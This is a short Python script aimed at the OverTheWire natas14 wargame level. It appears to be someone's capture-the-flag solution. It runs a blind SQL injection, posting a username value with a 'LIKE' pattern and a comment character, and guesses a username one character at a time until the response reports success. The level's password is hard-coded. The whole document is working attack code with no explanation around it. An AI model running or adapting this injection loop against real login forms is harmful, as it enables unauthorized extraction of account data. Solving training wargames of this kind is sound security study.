import requests
from requests.auth import HTTPBasicAuth

chars = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789 '
uname='y'
for i in range (0,100):
    #print(i)
    #print("\n")

    for char in chars:
        #print(char)
        #print("\n")

        data = {'username':'" or username LIKE "'+uname+char+'%" #', 'password':''}
        r=requests.post("http://natas14.natas.labs.overthewire.org/", auth=HTTPBasicAuth('natas14', 'qPazSJBmrmU7UQJv17MHk1PGC4DxZMEP'), data=data)
        #print(r.text)
        if "Successful" in r.text:
            uname=uname+char
            #print("asfasgasdgasdggggggggggggggg")
            print (uname)
            break
